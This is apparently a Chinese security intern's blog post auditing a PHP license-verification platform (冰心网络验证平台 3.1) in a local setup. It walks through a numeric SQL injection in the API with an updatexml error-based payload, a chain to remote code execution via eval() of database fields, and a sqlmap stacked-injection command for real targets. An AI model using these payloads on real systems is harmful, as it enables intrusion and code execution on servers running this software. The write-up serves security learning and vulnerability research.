{"title":"冰心网络验证平台3.1审计或漏洞复现","uid":"8a76ff70cc47792edc7663e7a400be26","slug":"冰心网络验证平台3-1审计或漏洞复现","date":"2022-12-01T07:04:21.000Z","updated":"2022-12-01T07:32:15.206Z","comments":true,"path":"api/articles/冰心网络验证平台3-1审计或漏洞复现.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">CREATE DATABASE &#96;BX&#96; DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</code></pre>\n\n<p>admin  admin</p>\n<p>审计资料：</p>\n<p><a href=\"https://zone.huoxian.cn/d/1177\">https://zone.huoxian.cn/d/1177</a></p>\n<p><a href=\"https://forum.butian.net/share/1206\">https://forum.butian.net/share/1206</a></p>\n<p>官方文档：<a href=\"https://www.kancloud.cn/li1446458045/wlyz/331886\">https://www.kancloud.cn/li1446458045/wlyz/331886</a></p>\n<p><strong>通过正则匹配sql注入点：</strong></p>\n<p><strong>$this-&gt;con(.*?){$</strong></p>\n<p>这个结果后面看参考资料验证，关键这个正则也不对啊！结果还是有单引号</p>\n<p>使用easy扫描才27个结果，后面可以一个一个的看</p>\n<p>代码量不多，现在试试审计前台</p>\n<h1 id=\"目录结构：\"><a href=\"#目录结构：\" class=\"headerlink\" title=\"目录结构：\"></a>目录结构：</h1><pre class=\"line-numbers language-none\"><code class=\"language-none\">app目录：用来存放视图控制器模型等。\n\nconfig目录：用来存放框架的一些公共配置文件。\n\ncore目录：用来存放一些基类文件，例如：控制器基类、模型基类、视图基类、request请求基类、\ndb链式操作基类等。\n\npublic\\static目录：用来存放一些静态资源，例如：图片、html视图文件、js、cs文件等。\n\nindex.php：整个框架的入口文件，进行分发启动。</code></pre>\n\n<h1 id=\"index-php\"><a href=\"#index-php\" class=\"headerlink\" title=\"index.php\"></a>index.php</h1><p>包含core\\common.php</p>\n<p>这个php文件被加密了，我尝试自己解密，发现太麻烦老是有问题。直接搜索发现在GitHub上有这个版本的直接解密版。直接用解密版的审计，解密等审计完有空再弄弄。</p>\n<h2 id=\"core-common-php\"><a href=\"#core-common-php\" class=\"headerlink\" title=\"core\\common.php\"></a>core\\common.php</h2><p>使用core\\lib\\Config.php、core\\lib\\Route.php</p>\n<p>config.php中只有一个类的get和set方法</p>\n<p>route.php就是路由类了，也没什么东西，后面有用再看</p>\n<p>包含了core\\lib\\Load.php，用来包含php文件的类</p>\n<p>又通过一个php文件包含了core\\function\\function.php，里面是一些方法</p>\n<p>接下来马上过滤$_GET，是数组就通过array_map过滤</p>\n<p>$_POST、$_COOKIE、$_REQUEST也都用addslashes函数过滤一遍</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">if (!get_magic_quotes_gpc()) &#123;&#x2F;&#x2F;始终返回false\n    if (!empty($_GET)) &#123;\n        $_GET &#x3D; addslashes_deep($_GET);\n    &#125;\n    if (!empty($_POST)) &#123;\n        $_POST &#x3D; addslashes_deep($_POST);\n    &#125;\n    $_COOKIE &#x3D; addslashes_deep($_COOKIE);\n    $_REQUEST &#x3D; addslashes_deep($_REQUEST);\n&#125;\n\n\n\nfunction addslashes_deep($value) &#123;\n\tif (empty($value)) &#123;\n\t\treturn $value;\n\t&#125; else &#123;\n\t\treturn is_array($value) ? array_map(&#39;addslashes_deep&#39;, $value) : addslashes($value);\n\t&#125;\n&#125;</code></pre>\n\n<p>后面就是初始化路由，看app目录了</p>\n<h1 id=\"app\"><a href=\"#app\" class=\"headerlink\" title=\"app\"></a>app</h1><p>第一次碰见这种服务端客户端结合的。看官方文档的api接口，第一个获取服务器信息的接口</p>\n<p>发送数据试试，没想到sql语句报错了。。。。。</p>\n<h2 id=\"Software-php-gt-getinfo-sql注入\"><a href=\"#Software-php-gt-getinfo-sql注入\" class=\"headerlink\" title=\"Software.php-&gt;getinfo   sql注入\"></a>Software.php-&gt;getinfo   sql注入</h2><p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/53.PNG\"></p>\n<p>id为数字时，返回的是404表示软件不存在，换了几个常见数字一直返回404，换成字母，发现sql语句报错了，但是前面index.php有全局转义，只能用数字型的注入试试</p>\n<p>看一下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">public function getInfo() &#123;\n  do_action(&#39;api_software_sw&#39;);\n  $res[&#39;version&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;version&#39;];\n  $res[&#39;notice&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;notice&#39;];\n  $res[&#39;update_data&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;update_data&#39;];\n  $res[&#39;update_type&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;update_type&#39;];\n  $res[&#39;static_data&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;static_data&#39;];\n  $res[&#39;trial_interval&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;trial_interval&#39;];\n  $res[&#39;software_state&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;software_state&#39;];\n  $res[&#39;bindingdel_type&#39;] &#x3D; $this-&gt;software[&#39;0&#39;][&#39;bindingdel_type&#39;];\n  exit(api_json(&#39;1&#39;,$res));\n&#125;</code></pre>\n\n<p>不是太明白，不过应该就是获取系统信息，最后输出的流程，为什么会有sql语句报错呢？不是太懂，动态调式看下处理流程是怎么回事。</p>\n<p>这个断点还得下再入口文件index.php上，要不然不能断掉</p>\n<p>不咋会调式，调了一遍，没找到sql语句的执行点，真菜啊！！！！</p>\n<p>直接用sql监控查看执行的sql语句</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/54.PNG\"></p>\n<p>语句为：select SELECT * FROM BX_software where id=adada;</p>\n<p>数字型的注入，再本地的cmd中用mysql测试发现</p>\n<p>id为数字，并且404表示的是数据库返回了空的结果</p>\n<p>接下来就是正常的注入流程了：</p>\n<p>直接报错注入</p>\n<p>id=1+and+(updatexml(1,concat(0x7e,(select+user()),0x7e),1))&amp;data=2</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/55.PNG\"></p>\n<p>不过，这种也不算是代码审计了。。。。。。</p>\n<p>后面再来调试看看！找到语句再分析原理吧！</p>\n<p>再看了一下代码，找到语句了，再common.php中。software继承了common并且实列化了。在调用init方法时就会触发sql注入漏洞：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">class Software extends Common &#123;\n\tfunction __construct() &#123;\n\t\tparent::init();\n\t&#125;</code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">protected function init() &#123;\n\t\trequire BX_ROOT . &#39;app&#x2F;api&#x2F;api_function.php&#39;;\n\t\t$id &#x3D; !empty($_POST[&#39;id&#39;]) ? $_POST[&#39;id&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$data &#x3D; !empty($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$this-&gt;con &#x3D; Db::getInstance();\n\t\t$this-&gt;software &#x3D; $this-&gt;con-&gt;select(&#39;software&#39;,&quot;id&#x3D;&#123;$id&#125;&quot;);\n\t\tif(!$this-&gt;software) &#123;\n\t\t\texit(api_json(&#39;404&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\t$this-&gt;isBlackIp();\n\t\t$this-&gt;log &#x3D; new InsertLog($this-&gt;software[&#39;0&#39;][&#39;id&#39;]);\n\t\tdefine(&#39;API_ENCRYPT&#39;,$this-&gt;software[&#39;0&#39;][&#39;encrypt&#39;]);\n\t\tdefine(&#39;API_KEY&#39;,$this-&gt;software[&#39;0&#39;][&#39;s_key&#39;]);\n\t\tif(API_ENCRYPT &#x3D;&#x3D; &#39;defined_encrypt&#39;) &#123;\n\t\t\teval($this-&gt;software[&#39;0&#39;][&#39;defined_encrypt&#39;]);\n\t\t&#125;\n\t\t$this-&gt;data &#x3D; bx_decrypt($data,API_KEY,API_ENCRYPT);\n\t\tif(!$this-&gt;data) &#123;\n\t\t\texit(api_json(&#39;444&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\tif($this-&gt;getState() &#x3D;&#x3D; &#39;2&#39;) &#123;\n\t\t\texit(api_json(&#39;403&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\tdo_action(&#39;api_common&#39;);\n\t&#125;</code></pre>\n\n<p>接收了$_POST[‘id’]的传参，并用select方法查询：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">public function select($table,$where &#x3D; &#39;&#39;, $join &#x3D; &#39;&#39;, $desc &#x3D; &#39;&#39;, $limit &#x3D; &#39;&#39;,$field &#x3D; &#39;&#39;) &#123;\n\t\ttry &#123;\n\t\t\t$ifwhere &#x3D; &#39;&#39;;\n\t\t\t$order &#x3D; &#39;&#39;;\n\t\t\t$desc_limit &#x3D; &#39;&#39;;\n\t\t\tif (! empty($where)) &#123;\n\t\t\t\t$ifwhere &#x3D; &quot;where &#123;$where&#125;&quot;;\n\t\t\t&#125;\n\t\t\tif (! empty($desc)) &#123;\n\t\t\t\t$order &#x3D; &quot;order by &#123;$desc&#125; desc&quot;;\n\t\t\t&#125;\n\t\t\tif (! empty($limit)) &#123;\n\t\t\t\t$desc_limit &#x3D; &quot;limit &#123;$limit&#125;&quot;;\n\t\t\t&#125;\n\t\t\tempty($field) ? $field &#x3D; &quot;*&quot; : FALSE;\n\t\t\t$sql &#x3D; &quot;SELECT &#123;$field&#125; FROM &#123;$this -&gt; pre&#125;&#123;$table&#125; &#123;$join&#125; &#123;$ifwhere&#125; &#123;$order&#125; &#123;$desc_limit&#125;&quot;;\n\t\t\t$sql &#x3D; str_replace(&#39;pre_&#39;,$this -&gt; pre, $sql);\n\t\t\t$Model &#x3D; $this-&gt;server-&gt;prepare($sql);\n\t\t\t$Model-&gt;execute();\n\t\t\t$m_data &#x3D; $Model-&gt;fetchAll(\\PDO::FETCH_ASSOC);\n\t\t\treturn $m_data;\n\t\t&#125;\n\t\tcatch (\\PDOException $e) &#123;\n\t\t\texit($e -&gt; getMessage());\n\t\t&#125;\n&#125;</code></pre>\n\n<p>可以看到直接拼接，只有前面的index.php有一个全局过滤</p>\n<p>所以，api里面的类只要继承了common.php的common类，并且调用了父类common的init方法，就能通过它产生注入</p>\n<p>那么，很简单了，接下来就直接找符合上面条件的类就行了</p>\n<h2 id=\"SingleCard类\"><a href=\"#SingleCard类\" class=\"headerlink\" title=\"SingleCard类\"></a>SingleCard类</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">class SingleCard extends Common &#123;\n\tfunction __construct() &#123;\n\t\tparent::init();\n\t&#125;</code></pre>\n\n<h2 id=\"User类\"><a href=\"#User类\" class=\"headerlink\" title=\"User类\"></a>User类</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">class User extends Common &#123;\n\tfunction __construct() &#123;\n\t\tparent::init();\n\t&#125;</code></pre>\n\n<p>剩下一个插件类，发现直接执行了sql语句，但是很可惜前面有全局过滤，而这个语句又经过了单引号包裹，所以无法注入</p>\n<h2 id=\"Plugin类\"><a href=\"#Plugin类\" class=\"headerlink\" title=\"Plugin类\"></a>Plugin类</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">public function getApi($id,$name&#x3D;&#39;&#39;) &#123;\n\t\t$con &#x3D; Db::getInstance();\n\t\t$res &#x3D; $con-&gt;select(&#39;plugin&#39;,&quot;directory&#x3D;&#39;&#123;$id&#125;&#39;&quot;);</code></pre>\n\n<p>这也只能算是一个注入点</p>\n<p>后面的都携带了单引号，没带的也都有复杂的处理流程，就是这个数据是先在数据库里面查了一遍的。也就是先带单引号查询了一遍，之后再将查询结果的数据取出再带入查询</p>\n<p>没有前台，只有接口，接口就是数据库查询，数据处理</p>\n<p>那这样的话，前台的漏洞应该就这个了，比sql注入危害小的漏洞，使用sql注入来达到漏洞利用的话有点小题大做。</p>\n<p>也就rce了，这个我是真的没想到，审计的太少，还得练</p>\n<p>直接看参考资料的利用方式来将sql注入的危害扩大</p>\n<p>使用的是危险函数查找的方法，全局搜素eval函数 ：eval(  只有两个文件有</p>\n<h1 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h1><p>一个还是api的控制器common.php，另外一个也是api的控制器Sofeware.php。刚刚提到过，这个程序就是不断查询数据库，插入内容，取出内容。而这个eval函数就是取出内容的时候使用的：</p>\n<h2 id=\"common-php\"><a href=\"#common-php\" class=\"headerlink\" title=\"common.php\"></a>common.php</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">protected function init() &#123;\n\t\trequire BX_ROOT . &#39;app&#x2F;api&#x2F;api_function.php&#39;;\n\t\t$id &#x3D; !empty($_POST[&#39;id&#39;]) ? $_POST[&#39;id&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$data &#x3D; !empty($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : exit(api_json(&#39;400&#39;,&#39;&#39;,false));\n\t\t$this-&gt;con &#x3D; Db::getInstance();\n\t\t$this-&gt;software &#x3D; $this-&gt;con-&gt;select(&#39;software&#39;,&quot;id&#x3D;&#123;$id&#125;&quot;);\n\t\tif(!$this-&gt;software) &#123;\n\t\t\texit(api_json(&#39;404&#39;,&#39;&#39;,false));\n\t\t&#125;\n\t\t$this-&gt;isBlackIp();\n\t\t$this-&gt;log &#x3D; new InsertLog($this-&gt;software[&#39;0&#39;][&#39;id&#39;]);\n\t\tdefine(&#39;API_ENCRYPT&#39;,$this-&gt;software[&#39;0&#39;][&#39;encrypt&#39;]);\n\t\tdefine(&#39;API_KEY&#39;,$this-&gt;software[&#39;0&#39;][&#39;s_key&#39;]);\n\t\tif(API_ENCRYPT &#x3D;&#x3D; &#39;defined_encrypt&#39;) &#123;\n\t\t\teval($this-&gt;software[&#39;0&#39;][&#39;defined_encrypt&#39;]);\n\t\t&#125;</code></pre>\n\n<h2 id=\"software-php\"><a href=\"#software-php\" class=\"headerlink\" title=\"software.php\"></a>software.php</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">public function remoteFun() &#123;\n\t\t$data &#x3D; $this-&gt;parseData();\n\t\tempty($data[&#39;name&#39;]) ? exit(api_json(&#39;1402&#39;)) : FALSE;\n\t\tdo_action(&#39;api_software_remote_fun&#39;,[$data]);\n\t\teval($this-&gt;software[&#39;0&#39;][&#39;remote&#39;]);\n\t\tif(!function_exists($data[&#39;name&#39;])) &#123;\n\t\t\texit(api_json(&#39;1401&#39;));\n\t\t&#125;\n\t\t$fun_param_num &#x3D; count(get_fucntion_parameter_name($data[&#39;name&#39;]));\n\t\tif($fun_param_num !&#x3D; &#39;0&#39;) &#123;\n\t\t\tempty($data[&#39;param&#39;]) ? exit(api_json(&#39;1402&#39;)) : FALSE;\n\t\t\t$res_param_num &#x3D; count($data[&#39;param&#39;]);\n\t\t\tif($fun_param_num !&#x3D; $res_param_num) &#123;\n\t\t\t\texit(api_json(&#39;1403&#39;));\n\t\t\t&#125;\n\t\t&#125; else &#123;\n\t\t\t$data[&#39;param&#39;] &#x3D; array();\n\t\t&#125;\n\t\texit(api_json(&#39;1408&#39;, array(&#39;result&#39;&#x3D;&gt;@call_user_func_array($data[&#39;name&#39;],$data[&#39;param&#39;])) ));\n\t&#125;</code></pre>\n\n<p>这时取出的数据库内容执行，要是没有前面的sql注入，我们是无法控制数据库的某个字段的内容的。但是现在有了sql注入漏洞，我们只需通过注入漏洞将取出的这个字段的内容修改成我们需要执行的代码，再通过触发该函数来执行代码。</p>\n<p>刚好common.php是前台可访问的，software.php也是前面可以访问的。这样就有了前台的RCE</p>\n<p>直接在本地修改mysql的字段看看能不能RCE，先看common.php的init函数提取的内容</p>\n<p>添加一个software，common.php显示当设置encrypt为defined_encrypt时，将会取出defined_encrypt的值，并使用eval函数执行代码。所以只需要修改这两条数据就行了，其他数据随便输入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">insert into BX_software (name,heart_time,version,notice,static_data,give_time,give_point,login_type,update_data,update_type,trial_interval,trial_data,software_state,binding_type,bindingdel_type,bindingdel_time,bindingdel_point,restrict_regtime,restrict_regnum,s_key,menber_id,remote,encrypt,defined_encrypt) values (&#39;1&#39;,&#39;180&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;24&#39;,&#39;3&#39;,&#39;hblQ2Sy1v7hzecAgnltsnbx7EsIex7AV6f33EmT9&#39;,&#39;1&#39;,&#39;&#39;,&#39;defined_encrypt&#39;,&#39;phpinfo();&#39;);</code></pre>\n\n<p>接下来直接访问api的Software不需要添加方法，因为会默认执行</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/56.PNG\"></p>\n<p>这里的id就是刚刚才入的那条数据的id，data为任意值</p>\n<p>再看看software提取的内容，提取remote的内容eval执行，在插入一条数据，修改remote字段为phpinfo();</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">insert into BX_software (name,heart_time,version,notice,static_data,give_time,give_point,login_type,update_data,update_type,trial_interval,trial_data,software_state,binding_type,bindingdel_type,bindingdel_time,bindingdel_point,restrict_regtime,restrict_regnum,s_key,menber_id,remote,encrypt,defined_encrypt) values (&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;phpinfo();&#39;,&#39;1&#39;,&#39;&#39;);</code></pre>\n\n<p>使用远程调用函数的api</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/57.PNG\"></p>\n<p>怎么没有执行代码呢？查了一下代码发现，再common.php的init函数的最后面。当对data数据进行解密后会进行判断，不成功会直接返回400，查看解密函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">function bx_decrypt($data,$key,$type) &#123;\n\tswitch ($type) &#123;\n\t\tcase &#39;authcode&#39;: return authcode($data,&#39;DECODE&#39;,$key);\n\t\tbreak;\n\t\tcase &#39;rc4&#39;: return rc4($key,base64_decode($data));\n\t\tbreak;\n\t\tcase &#39;no&#39;: return stripslashes($data);\n\t\tbreak;\n\t\tcase &#39;defined_encrypt&#39;: return @call_user_func_array(&#39;bx_defined_decrypt&#39;,array($data,$key));\n\t\tbreak;\n\t\tdefault: break;\n\t&#125;\n&#125;</code></pre>\n\n<p>所以需要修改encrypt的值为no就行了</p>\n<p>update bx_software set encrypt=’no’ where id =4;</p>\n<p>接着访问，发现返回1402表示缺少参数</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/58.PNG\"></p>\n<p>看一下代码发现需要再data中有name的值，并使用了解析，发现是json，直接将data数据改为json格式并且添加name字段值</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/59.PNG\"></p>\n<p>成功</p>\n<p>实战时如何修改或是插入数据呢？参考文章2提到可以使用堆叠注入获取sql-shell来执行sql语句</p>\n<p>python3 sqlmap.py -r 1.txt –dbms=mysql -p “id”  –technique=S –sql-shell </p>\n<h1 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h1><p><strong>官方文档真的特别重要！！！！！</strong></p>\n<p>后台的我就不看了，没什么意思。。。</p>\n<h1 id=\"吐槽：\"><a href=\"#吐槽：\" class=\"headerlink\" title=\"吐槽：\"></a>吐槽：</h1><p>好冷啊！！！</p>\n<p>还是太菜了，听说php都没什么用了。大部分人现在都在卷java，后面还是审计一些Java的cms吧！php的漏洞玩的都是16，17年玩剩下的了。代码审计星球里几年前php的技巧都不会。。。。。就是走前人走过的路都要花费很长时间啊！！！更别说找出点自己独门的技巧了！！</p>\n<p>真冷！！！</p>\n","text":" CREATE DATABASE &#96;BX&#96; DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci; admin admin 审计资料： https://zone.huoxian.cn/d/1177 https://f...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":3,"path":"api/categories/代码审计.json"}],"tags":[{"name":"PHP","slug":"PHP","count":4,"path":"api/tags/PHP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%EF%BC%9A\"><span class=\"toc-text\">目录结构：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#index-php\"><span class=\"toc-text\">index.php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#core-common-php\"><span class=\"toc-text\">core\\common.php</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#app\"><span class=\"toc-text\">app</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Software-php-gt-getinfo-sql%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">Software.php-&gt;getinfo   sql注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SingleCard%E7%B1%BB\"><span class=\"toc-text\">SingleCard类</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#User%E7%B1%BB\"><span class=\"toc-text\">User类</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Plugin%E7%B1%BB\"><span class=\"toc-text\">Plugin类</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#RCE\"><span class=\"toc-text\">RCE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#common-php\"><span class=\"toc-text\">common.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#software-php\"><span class=\"toc-text\">software.php</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">小结：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%90%E6%A7%BD%EF%BC%9A\"><span class=\"toc-text\">吐槽：</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"2022小结","uid":"2c9fa563608f4b9eb0cd953103b9e032","slug":"2022小结","date":"2022-11-14T03:11:36.000Z","updated":"2022-12-01T07:03:30.747Z","comments":true,"path":"api/articles/2022小结.json","keywords":null,"cover":null,"text":" 总算是把那一本考点单词书背了一遍。 php审计入门了，还得多练。 Java安全还在入门，要点太多，特性太多，需要点时间。 最近正好学了一下数据结构和算法，用Java实现，也算是练了一点Java基础。 以前看那些搞Java安全比较出名的白帽，不懂为什么有些一直在焦虑自己菜。直到看...","link":"","photos":[],"count_time":{"symbolsCount":408,"symbolsTime":"1 mins."},"categories":[{"name":"总结","slug":"总结","count":4,"path":"api/categories/总结.json"}],"tags":[{"name":"总结","slug":"总结","count":4,"path":"api/tags/总结.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}